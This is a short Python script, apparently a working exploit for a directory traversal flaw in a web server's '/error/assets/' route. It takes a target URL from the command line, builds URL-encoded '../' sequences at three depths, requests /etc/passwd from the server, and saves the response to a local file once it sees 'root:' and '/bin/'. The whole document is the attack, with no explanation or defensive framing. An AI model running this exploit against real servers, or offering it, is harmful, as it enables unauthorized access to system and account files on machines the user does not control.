import sys
import urllib.parse
import urllib.request

BASE = sys.argv[1].rstrip("/")
TARGET = "/etc/passwd"

def encode_path(path):
    return urllib.parse.quote(path, safe="/").replace("/", "%2f")

for depth in (9, 10, 11):
    param = "%2e%2e%2f" * depth + encode_path(TARGET.lstrip("/"))
    url = BASE + "/error/assets/" + param
    body = urllib.request.urlopen(url, timeout=5).read()
    if b"root:" in body and b"/bin/" in body:
        with open("passwd.bin", "wb") as fh:
            fh.write(body)
        break
